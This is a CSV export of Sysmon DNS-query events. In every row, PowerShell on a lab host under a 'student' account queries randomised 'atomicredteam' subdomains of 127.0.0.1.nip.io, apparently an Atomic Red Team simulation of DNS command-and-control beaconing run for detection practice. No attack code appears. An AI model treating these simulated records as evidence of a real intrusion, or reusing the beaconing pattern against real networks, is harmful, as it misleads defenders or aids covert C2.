"2025-12-22 13:59:09.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166267,"Query: atomicredteam-113857.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.245","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.184 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166268,"Query: atomicredteam-963543.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.291","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.184 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166269,"Query: atomicredteam-74947.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.333","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.184 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166270,"Query: atomicredteam-380701.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.184 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166271,"Query: atomicredteam-636590.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.185 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166272,"Query: atomicredteam-395040.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.741","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.185 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166273,"Query: atomicredteam-33268.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.784","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.185 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166274,"Query: atomicredteam-357795.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.827","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.199 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166275,"Query: atomicredteam-899938.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.222","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.200 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166276,"Query: atomicredteam-431216.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.267","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.200 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166277,"Query: atomicredteam-794017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.311","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.200 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166278,"Query: atomicredteam-950049.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.353","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.200 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166279,"Query: atomicredteam-178472.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.395","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.201 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166280,"Query: atomicredteam-943889.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.441","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.201 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166281,"Query: atomicredteam-965572.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.483","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.201 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166282,"Query: atomicredteam-616277.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.202 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166283,"Query: atomicredteam-234017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.202 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166284,"Query: atomicredteam-456171.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.612","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.202 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166285,"Query: atomicredteam-107937.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.657","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:11.202 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166286,"Query: atomicredteam-324849.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:10.977","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166287,"Query: atomicredteam-825258.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.157","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166288,"Query: atomicredteam-231636.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.199","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166289,"Query: atomicredteam-971912.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166290,"Query: atomicredteam-221141.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.292","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166291,"Query: atomicredteam-973074.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.336","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.205 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166292,"Query: atomicredteam-332522.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.380","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166293,"Query: atomicredteam-803855.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.423","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166294,"Query: atomicredteam-821630.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.465","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166295,"Query: atomicredteam-304556.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166296,"Query: atomicredteam-388788.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.676","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166297,"Query: atomicredteam-526332.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166298,"Query: atomicredteam-211785.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.891","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166299,"Query: atomicredteam-919887.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:11.934","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:12.206 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166300,"Query: atomicredteam-295729.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.116","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.210 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166301,"Query: atomicredteam-841186.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.160","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.210 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166302,"Query: atomicredteam-293288.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.331","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.210 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166303,"Query: atomicredteam-884350.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.376","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.211 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166304,"Query: atomicredteam-514542.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.211 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166305,"Query: atomicredteam-804564.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.592","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.211 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166306,"Query: atomicredteam-87646.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.212 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166307,"Query: atomicredteam-285684.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.817","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.212 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166308,"Query: atomicredteam-403669.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.212 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166309,"Query: atomicredteam-863661.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.917","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:13.213 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166310,"Query: atomicredteam-486175.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:12.959","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.212 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166311,"Query: atomicredteam-353686.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.003","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.212 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166312,"Query: atomicredteam-551980.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.048","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.213 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166313,"Query: atomicredteam-567619.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.091","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.213 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166314,"Query: atomicredteam-383574.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.213 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166315,"Query: atomicredteam-749018.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.308","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
